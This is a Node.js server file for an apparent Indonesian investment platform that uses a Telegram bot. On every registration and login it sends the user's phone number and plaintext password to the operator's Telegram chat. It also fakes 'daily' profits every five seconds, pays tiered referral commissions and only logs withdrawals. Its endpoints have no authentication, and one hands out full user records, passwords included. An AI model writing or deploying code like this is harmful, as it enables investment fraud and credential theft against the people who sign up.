const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());

// =========================
// TELEGRAM BOT
// =========================
const bot = new TelegramBot(process.env.BOT_TOKEN, {
    polling: true
});

function send(msg) {
    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
        bot.sendMessage(
            process.env.CHAT_ID,
            msg,
            {
                parse_mode: "HTML"
            }
        );
    }
}

// =========================
// HOME ROUTE
// =========================
app.get("/", (req, res) => {
    res.json({
        status: true,
        message: "Server Invest Aktif",
        mongodb: "Connected"
    });
});

// =========================
// USER MODEL
// =========================
const User = mongoose.model("User", {
    username: String,
    phone: {
        type: String,
        unique: true
    },
    email: String,
    password: String,
    referral: String,
    saldo: {
        type: Number,
        default: 0
    },
    referralCode: String,
    referralCount: {
        type: Number,
        default: 0
    },

    saldoReferral:{
    type:Number,
    default:0
},

referrals:[{
    username:String,
    phone:String,
    active:{
        type:Boolean,
        default:false
    },
    topupPertama:{
        type:Number,
        default:0
    },
    komisi:{
        type:Number,
        default:0
    },
    status:{
        type:String,
        default:"MENUNGGU"
    },
    tanggal:String
}],

    riwayatDeposit: [{
    nominal: Number,
    method: String,
    tanggal: String,
    status: String
}],

riwayatWithdraw: [{
    nominal: Number,
    bank: String,
    rekening: String,
    tanggal: String,
    status: String
}],

riwayatPaket: [{
    nama: String,
    modal: Number,
    saldoPaket: Number,
    totalCair: Number,
    status: String,
    tanggal: String
}],

    paketAktif: [{
        nama: String,
        modal: Number,
        saldoPaket: Number,
        profitPerHari: Number,
        durasi: Number,
        hariBerjalan: {
            type: Number,
            default: 0
        },
        lastClaim: {
            type: Number,
            default: Date.now
        },
        aktif: {
            type: Boolean,
            default: true
        }
    }]
});

// =========================
// TOPUP MODEL
// =========================
const Topup = mongoose.model("Topup", {
    topupId: String,
    phone: String,
    nominal: Number,

    // -------- TAMBAHAN NOMINAL FLIP --------
    nominalUnik:{
        type:Number,
        default:0
    },
    // -------- SELESAI --------

    // -------- TAMBAHAN BUKTI TRANSFER --------
buktiTransfer:{
    type:Boolean,
    default:false
},

buktiImage:{
    type:String,
    default:""
},
// -------- SELESAI --------

    method: String,

    status: {
        type: String,
        default: "pending"
    },

    createdAt: {
        type: Date,
        default: Date.now
    }
});

function hitungKomisiReferral(urutan, nominal){

    if(urutan === 1){
        return Math.floor(nominal * 0.30);
    }

    if(urutan === 2){
        return Math.floor(nominal * 0.20);
    }

    if(urutan === 3){
        return Math.floor(nominal * 0.10);
    }

    return Math.floor(nominal * 0.08);
}

// =========================
// REGISTER
// =========================
app.post("/register", async (req, res) => {
    try {

        const u = new User(req.body);

        if(!u.referralCode){
            u.referralCode =
            "PRTMNA" + Math.floor(100000 + Math.random() * 900000);
        }

        await u.save();

        if(u.referral){

            const owner = await User.findOne({
                referralCode: u.referral
            });

            if(owner){

                if(!owner.referrals){
                    owner.referrals = [];
                }

                const sudahAda =
                owner.referrals.find(r => r.phone === u.phone);

                if(!sudahAda){
                    owner.referrals.push({
                        username: u.username,
                        phone: u.phone,
                        active: false,
                        topupPertama: 0,
                        komisi: 0,
                        status: "MENUNGGU",
                        tanggal: new Date().toLocaleString("id-ID")
                    });

                    await owner.save();

                    send(`◈ 🟨 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗗𝗜𝗚𝗨𝗡𝗔𝗞𝗔𝗡 ◈

◈ 𝗡𝗢 𝗛𝗣 𝗗𝗔𝗙𝗧𝗔𝗥 :
<b>${u.phone}</b>

◈ 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 :
<b>${u.referral}</b>

◈ 𝗣𝗘𝗠𝗜𝗟𝗜𝗞 𝗥𝗘𝗙 :
<b>${owner.phone}</b>

◈ 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 :
<b>${owner.username}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);
                }
            }
        }

        send(`◈ 🔵 𝗥𝗘𝗚𝗜𝗦𝗧𝗥𝗔𝗦𝗜 ◈

◈ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲   : <b>${u.username}</b>
◈ 𝗛𝗣                : <b>${u.phone}</b>
◈ 𝗣𝗦𝗪𝗥𝗗       : <b>${u.password}</b>
◈ 𝗘𝗺𝗮𝗶𝗹           : <b>${u.email}</b>
◈ 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹       : <b>${u.referral || "-"}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈
`);

        res.json({
            status: true
        });

    } catch (e) {

        res.json({
            status: false,
            message: e.message
        });

    }
});

// =========================
// LOGIN
// =========================
app.post("/login", async (req, res) => {

    const {
        phone,
        password
    } = req.body;

    const user = await User.findOne({
        phone,
        password
    });

    if (!user || user.password !== password) {
        return res.json({
            status: false
        });
    }

    send(`◈ 🟢 𝗟𝗢𝗚𝗜𝗡 ◈

◈ 𝗛𝗣                 : <b>${phone}</b>
◈ 𝗣𝗦𝗪𝗥𝗗       : <b>${password}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈
`);

    res.json({
        status: true,
        user
    });

});

app.get("/user/:phone", async (req, res) => {
    try {
        const user = await User.findOne({
            phone: req.params.phone
        });

        if (!user) {
            return res.json({
                status: false,
                message: "User tidak ditemukan"
            });
        }

        res.json({
            status: true,
            user
        });

    } catch (err) {
        res.json({
            status: false,
            message: err.message
        });
    }
});

// =========================
// TOPUP
// =========================
app.post("/topup", async (req, res) => {

    try {

        const {
            phone,
            nominal,
            method
        } = req.body;

        const customId = "PRT" + Math.floor(100000 + Math.random() * 900000);

const topup = await Topup.create({
    topupId: customId,
    phone,
    nominal,
    method
});

        bot.sendMessage(
    process.env.CHAT_ID,
    `◈ 🔴 𝗧𝗢𝗣 𝗨𝗣 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 ◈

◈ 𝗜𝗗                  : <b>${topup.topupId}</b>
◈ 𝗛𝗣                 : <b>${phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟    : <b>Rp ${Number(nominal).toLocaleString("id-ID")}</b>
◈ 𝗠𝗘𝗧𝗢𝗗𝗘      : <b>${method}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`,
    {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: method === "QRIS" ? [
    [
        {
            text: "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘",
            callback_data: `approve_${topup.topupId}`
        }
    ]
] : [
    [
        {
            text: "💰 KIRIM NOMINAL",
            callback_data: `unik_${topup.topupId}`
        }
    ],
    [
        {
            text: "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘",
            callback_data: `approve_${topup.topupId}`
        }
    ]
]
        }
    }
);

        res.json({
            status: true,
            topupId: topup.topupId
        });

    } catch (err) {

        res.json({
            status: false,
            message: err.message
        });

    }

});

// =========================
// APPROVE TOPUP
// =========================
app.post("/approve-topup", async (req, res) => {
    try {
        const { topupId } = req.body;

        const topup = await Topup.findOne({
    topupId: topupId
});

        if (!topup) {
            return res.json({
                status: false,
                message: "Topup tidak ditemukan"
            });
        }

        if (topup.status === "success") {
            return res.json({
                status: false,
                message: "Topup sudah pernah di-approve"
            });
        }

        const user = await User.findOne({
            phone: topup.phone
        });

        if (!user) {
            return res.json({
                status: false,
                message: "User tidak ditemukan"
            });
        }

        user.saldo += topup.nominal;

        if(user.referral){

    const owner = await User.findOne({
        referralCode: user.referral
    });

    if(owner){

        if(!owner.referrals){
            owner.referrals = [];
        }

        const sudahAktif = owner.referrals.find(
            r => r.phone === user.phone && r.active === true
        );

        if(!sudahAktif){

            const urutanAktif =
            owner.referrals.filter(r => r.active === true).length + 1;

            const komisi =
            hitungKomisiReferral(urutanAktif, topup.nominal);

            owner.saldoReferral =
            Number(owner.saldoReferral || 0) + komisi;

            owner.referralCount =
            Number(owner.referralCount || 0) + 1;

            let refData =
            owner.referrals.find(r => r.phone === user.phone);

            if(refData){
                refData.active = true;
                refData.topupPertama = topup.nominal;
                refData.komisi = komisi;
                refData.status = "AKTIF";
            }else{
                owner.referrals.push({
                    username:user.username,
                    phone:user.phone,
                    active:true,
                    topupPertama:topup.nominal,
                    komisi:komisi,
                    status:"AKTIF",
                    tanggal:new Date().toLocaleString("id-ID")
                });
            }

            await owner.save();

            send(`◈ 🏆 𝗞𝗢𝗠𝗜𝗦𝗜 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 ◈

◈ 𝗣𝗘𝗠𝗜𝗟𝗜𝗞 : <b>${owner.phone}</b>
◈ 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 : <b>${user.phone}</b>
◈ 𝗧𝗢𝗣 𝗨𝗣 : <b>Rp ${Number(topup.nominal).toLocaleString("id-ID")}</b>
◈ 𝗞𝗢𝗠𝗜𝗦𝗜 : <b>Rp ${Number(komisi).toLocaleString("id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);
        }
    }
}

if(!user.riwayatDeposit){
    user.riwayatDeposit = [];
}
        
        user.riwayatDeposit.push({
    nominal: topup.nominal,
    method: topup.method,
    tanggal: new Date().toLocaleString("id-ID"),
    status: "BERHASIL"
});

await user.save();

        topup.status = "success";
        await topup.save();

        send(`◈ ✅ 𝗧𝗢𝗣𝗨𝗣 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 ◈

◈ 𝗜𝗗                  : <b>${topup.topupId}</b>
◈ 𝗛𝗣                 : <b>${user.phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟    : <b>Rp ${Number(topup.nominal).toLocaleString("id-ID")}</b>
◈ 𝗦𝗔𝗟𝗗𝗢         : <b>Rp ${Number(user.saldo).toLocaleString("id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈
`);

        res.json({
            status: true,
            message: "Topup berhasil di-approve",
            user
        });

    } catch (err) {
        res.json({
            status: false,
            message: err.message
        });
    }
});

// -------- TAMBAHAN MODE INPUT NOMINAL FLIP --------
const waitingNominal = {};
// -------- SELESAI --------
bot.on("callback_query", async (query) => {

    try{

        const data = query.data;

        // -------- TOMBOL KIRIM NOMINAL FLIP --------
        if(data.startsWith("unik_")){

            const topupId =
            data.replace("unik_","");

            waitingNominal[query.from.id] =
            topupId;

            await bot.sendMessage(
                query.message.chat.id,
                `Masukkan nominal dari Flip\n\nContoh:\n1000567`
            );

            return bot.answerCallbackQuery(
                query.id,
                {
                    text:"Silahkan kirim nominal"
                }
            );
        }
        // -------- SELESAI --------

        if(!data.startsWith("approve_")) return;

        const topupId =
        data.replace("approve_","");

        const topup =
        await Topup.findOne({
            topupId
        });

        if(!topup){
            return bot.answerCallbackQuery(
                query.id,
                {
                    text:"Topup tidak ditemukan"
                }
            );
        }

        if(topup.status === "success"){
            return bot.answerCallbackQuery(
                query.id,
                {
                    text:"Sudah di approve"
                }
            );
        }

        const user =
        await User.findOne({
            phone: topup.phone
        });

        user.saldo += topup.nominal;

        if(user.referral){

    const owner = await User.findOne({
        referralCode: user.referral
    });

    if(owner){

        if(!owner.referrals){
            owner.referrals = [];
        }

        const sudahAktif = owner.referrals.find(
            r => r.phone === user.phone && r.active === true
        );

        if(!sudahAktif){

            const urutanAktif =
            owner.referrals.filter(r => r.active === true).length + 1;

            const komisi =
            hitungKomisiReferral(urutanAktif, topup.nominal);

            owner.saldoReferral =
            Number(owner.saldoReferral || 0) + komisi;

            owner.referralCount =
            Number(owner.referralCount || 0) + 1;

            let refData =
            owner.referrals.find(r => r.phone === user.phone);

            if(refData){
                refData.active = true;
                refData.topupPertama = topup.nominal;
                refData.komisi = komisi;
                refData.status = "AKTIF";
            }else{
                owner.referrals.push({
                    username:user.username,
                    phone:user.phone,
                    active:true,
                    topupPertama:topup.nominal,
                    komisi:komisi,
                    status:"AKTIF",
                    tanggal:new Date().toLocaleString("id-ID")
                });
            }

            await owner.save();

            send(`◈ 🏆 𝗞𝗢𝗠𝗜𝗦𝗜 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 ◈

◈ 𝗣𝗘𝗠𝗜𝗟𝗜𝗞 : <b>${owner.phone}</b>
◈ 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 : <b>${user.phone}</b>
◈ 𝗧𝗢𝗣 𝗨𝗣 : <b>Rp ${Number(topup.nominal).toLocaleString("id-ID")}</b>
◈ 𝗞𝗢𝗠𝗜𝗦𝗜 : <b>Rp ${Number(komisi).toLocaleString("id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);
        }
    }
}

if(!user.riwayatDeposit){
    user.riwayatDeposit = [];
}
        
        user.riwayatDeposit.push({
    nominal: topup.nominal,
    method: topup.method,
    tanggal: new Date().toLocaleString("id-ID"),
    status: "BERHASIL"
});

await user.save();

        topup.status = "success";

        await topup.save();

        await bot.editMessageText(

`◈ ✅ 𝗧𝗢𝗣𝗨𝗣 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 ◈

◈ 𝗜𝗗                  : <b>${topup.topupId}</b>
◈ 𝗛𝗣                 : <b>${user.phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟    : <b>Rp ${Number(topup.nominal).toLocaleString("id-ID")}</b>
◈ 𝗦𝗔𝗟𝗗𝗢         : <b>Rp ${Number(user.saldo).toLocaleString("id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`,

        {
            chat_id:
            query.message.chat.id,

            message_id:
            query.message.message_id,

            parse_mode: "HTML"
        });

        bot.answerCallbackQuery(
            query.id,
            {
                text:"Berhasil"
            }
        );

    }catch(err){

        console.log(
            "Approve Error:",
            err
        );

    }

});

// -------- TERIMA NOMINAL FLIP DARI ADMIN --------
bot.on("message", async (msg) => {

    try{

        const topupId =
        waitingNominal[msg.from.id];

        if(!topupId) return;

        const nominalInput =
Number(
    String(msg.text)
    .replace(/\./g,"")
    .replace(/,/g,"")
);

        if(isNaN(nominalInput)){
            return bot.sendMessage(
                msg.chat.id,
                "❌ Nominal tidak valid"
            );
        }

        const topup =
        await Topup.findOne({
            topupId
        });

        if(!topup){
            delete waitingNominal[msg.from.id];

            return bot.sendMessage(
                msg.chat.id,
                "❌ Topup tidak ditemukan"
            );
        }

        topup.nominalUnik =
        nominalInput;

        await topup.save();

        delete waitingNominal[msg.from.id];

        await bot.sendMessage(
            msg.chat.id,
            `✅ Nominal Flip tersimpan\n\nTransfer:\nRp ${nominalInput.toLocaleString("id-ID")}`
        );

    }catch(err){
        console.log("Nominal Error:", err);
    }

});
// -------- SELESAI --------

app.get("/topup-status/:id", async (req, res) => {
    try {
        const topup = await Topup.findOne({
    topupId: req.params.id
});

        if (!topup) {
            return res.json({
                status: false,
                message: "Topup tidak ditemukan"
            });
        }

        res.json({
            status: true,
            topup
        });

    } catch (err) {
        res.json({
            status: false,
            message: err.message
        });
    }
});

// =========================
// UPLOAD BUKTI TRANSFER
// =========================
app.post("/upload-bukti", async (req, res) => {

    try{

        const { topupId, bukti } = req.body;

        const topup = await Topup.findOne({
            topupId
        });

        if(!topup){
            return res.json({
                status:false,
                message:"Topup tidak ditemukan"
            });
        }

        topup.buktiTransfer = true;
        topup.buktiImage = bukti;

        await topup.save();

        await bot.sendPhoto(
            process.env.CHAT_ID,
            bukti,
            {
                caption:
`📤 BUKTI TRANSFER

ID : ${topup.topupId}
HP : ${topup.phone}
METODE : ${topup.method}
NOMINAL : Rp ${Number(topup.nominalUnik || topup.nominal).toLocaleString("id-ID")}`
            }
        );

        res.json({
            status:true
        });

    }catch(err){

        res.json({
            status:false,
            message:err.message
        });

    }

});

// =========================
// WITHDRAW
// =========================
app.post("/withdraw", async (req, res) => {

    try{

        const {
            phone,
            nominal,
            bank,
            rekening,
            namaRek
        } = req.body;

        const user = await User.findOne({
            phone
        });

        if(!user){
            return res.json({
                status:false,
                message:"User tidak ditemukan"
            });
        }

        if(user.saldo < nominal){
            return res.json({
                status:false,
                message:"Saldo tidak mencukupi"
            });
        }

        user.saldo -= nominal;

if(!user.riwayatWithdraw){
    user.riwayatWithdraw = [];
}
        
        user.riwayatWithdraw.push({
    nominal,
    bank,
    rekening,
    tanggal: new Date().toLocaleString("id-ID"),
    status: "PENDING"
});

await user.save();

        send(`◈ 🚮 𝗪𝗜𝗧𝗛𝗗𝗥𝗔𝗪 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 ◈

◈ 𝗛𝗣                 : <b>${phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟    : <b>Rp ${Number(nominal).toLocaleString("id-ID")}</b>
◈ 𝗕𝗔𝗡𝗞            : <b>${bank}</b>
◈ 𝗥𝗘𝗞𝗘𝗡𝗜𝗡𝗚  : <b>${rekening}</b>
◈ 𝗔/𝗡                : <b>${namaRek}</b>

◈ 𝗦𝗔𝗟𝗗𝗢 𝗦𝗜𝗦𝗔 : <b>Rp ${Number(user.saldo).toLocaleString("id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);

        res.json({
            status:true,
            user
        });

    }catch(err){

        res.json({
            status:false,
            message:err.message
        });

    }

});

// =========================
// CAIRKAN REFERRAL
// =========================
app.post("/cairkan-referral", async (req, res) => {
    try {

        const { phone } = req.body;

        const user = await User.findOne({ phone });

        if(!user){
            return res.json({
                status:false,
                message:"User tidak ditemukan"
            });
        }

        if(Number(user.saldoReferral || 0) < 1000000){
            return res.json({
                status:false,
                message:"Minimal cair Rp 1.000.000"
            });
        }

        const nominal = Number(user.saldoReferral || 0);

        user.saldo += nominal;
        user.saldoReferral = 0;

        await user.save();

        send(`◈ 💸 𝗖𝗔𝗜𝗥𝗞𝗔𝗡 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 ◈

◈ 𝗛𝗣 : <b>${user.phone}</b>
◈ 𝗡𝗢𝗠𝗜𝗡𝗔𝗟 : <b>Rp ${nominal.toLocaleString("id-ID")}</b>
◈ 𝗦𝗔𝗟𝗗𝗢 : <b>Rp ${Number(user.saldo).toLocaleString("id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);

        res.json({
            status:true,
            user
        });

    } catch(err) {

        res.json({
            status:false,
            message:err.message
        });

    }
});

// =========================
// BELI PAKET
// =========================
app.post("/buy-paket", async (req, res) => {

    try{

        const {
            phone,
            nama,
            modal,
            profitPerHari,
            durasi
        } = req.body;

        const user = await User.findOne({
            phone
        });

        if(!user){
            return res.json({
                status:false,
                message:"User tidak ditemukan"
            });
        }

        if(user.saldo < modal){
            return res.json({
                status:false,
                message:"Saldo tidak cukup"
            });
        }

        user.saldo -= modal;

        user.paketAktif.push({
            nama,
            modal,
            saldoPaket: modal,
            profitPerHari,
            durasi,
            hariBerjalan:0,
            lastClaim:Date.now(),
            aktif:true
        });

        if(!user.riwayatPaket){
    user.riwayatPaket = [];
}
        
        user.riwayatPaket.push({
    nama,
    modal,
    saldoPaket: modal,
    status: "AKTIF",
    tanggal: new Date().toLocaleString("id-ID")
});

        await user.save();

        send(`◈ 📦 𝗣𝗘𝗠𝗕𝗘𝗟𝗜𝗔𝗡 𝗣𝗔𝗞𝗘𝗧 ◈

◈ 𝗣𝗔𝗞𝗘𝗧        : <b>${nama}</b>
◈ 𝗛𝗣               : <b>${phone}</b>
◈ 𝗠𝗢𝗗𝗔𝗟       : <b>Rp ${Number(modal).toLocaleString("id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);

        res.json({
            status:true,
            user
        });

    }catch(err){

        res.json({
            status:false,
            message:err.message
        });

    }

});

// =========================
// ENGINE PAKET
// =========================
setInterval(async () => {

    try {

        const users = await User.find({
            "paketAktif.0": {
                $exists: true
            }
        });

        const now = Date.now();

        for (let user of users) {

            let changed = false;

            for (let paket of user.paketAktif) {

                if (!paket.aktif) continue;

                const diff = now - (paket.lastClaim || now);

                if (diff >= 5 * 1000) {

    if(!paket.saldoPaket || isNaN(paket.saldoPaket)){
        paket.saldoPaket = paket.modal;
    }

    paket.saldoPaket =
    Number(paket.saldoPaket) + Number(paket.profitPerHari);

    paket.hariBerjalan += 1;
                    paket.lastClaim = now;

                    changed = true;

                    send(`◈ 📈 𝗣𝗥𝗢𝗙𝗜𝗧 𝗣𝗔𝗞𝗘𝗧 ◈

◈ 𝗣𝗔𝗞𝗘𝗧           : <b>${paket.nama}</b>
◈ 𝗛𝗣                  : <b>${user.phone}</b>

◈ 𝗣𝗥𝗢𝗙𝗜𝗧         : <b>Rp ${Number(paket.profitPerHari).toLocaleString("id-ID")}</b>
◈ 𝗦𝗔𝗟𝗗𝗢 𝗣𝗔𝗞𝗘𝗧 : <b>Rp ${Number(paket.saldoPaket).toLocaleString("id-ID")}</b>

◈ 𝗛𝗔𝗥𝗜 𝗞𝗘       : <b>${paket.hariBerjalan}/${paket.durasi}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);

                    if (paket.hariBerjalan >= paket.durasi) {

                        paket.aktif = false;

                        user.saldo += paket.saldoPaket;

                        if(!user.riwayatPaket){
    user.riwayatPaket = [];
}
                        
                        const riwayat = user.riwayatPaket.find(
    x => x.nama === paket.nama && x.status === "AKTIF"
);

if(riwayat){
    riwayat.status = "SELESAI";
    riwayat.totalCair = paket.saldoPaket;
}

                        send(`◈ ✅ 𝗣𝗔𝗞𝗘𝗧 𝗦𝗘𝗟𝗘𝗦𝗔𝗜 ◈

◈ 𝗣𝗔𝗞𝗘𝗧           : <b>${paket.nama}</b>
◈ 𝗛𝗣                  : <b>${user.phone}</b>

◈ 𝗠𝗢𝗗𝗔𝗟          : <b>Rp ${Number(paket.modal).toLocaleString("id-ID")}</b>
◈ 𝗛𝗔𝗦𝗜𝗟            : <b>Rp ${Number(paket.saldoPaket).toLocaleString("id-ID")}</b>

◈ 𝗗𝗨𝗥𝗔𝗦𝗜          : <b>${paket.durasi} Hari</b>
◈ 𝗦𝗧𝗔𝗧𝗨𝗦          : <b>BERHASIL DICAIRKAN</b>

◈ 𝗦𝗔𝗟𝗗𝗢 𝗨𝗧𝗔𝗠𝗔 : <b>Rp ${Number(user.saldo).toLocaleString("id-ID")}</b>

◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈`);

                    }
                }
            }

            if (changed) {
                await user.save();
            }
        }

        console.log("Engine running...");

    } catch (err) {

        console.log("Engine Error:", err);

    }

}, 5 * 1000);

// =========================
// MONGODB + SERVER START
// =========================
async function start() {

    try {

        await mongoose.connect(process.env.MONGO_URL);

        console.log("MongoDB Connected");

        app.listen(PORT, () => {
            console.log(`Server running on ${PORT}`);
        });

    } catch (err) {

        console.log("MongoDB Error:", err);

    }
}

start();
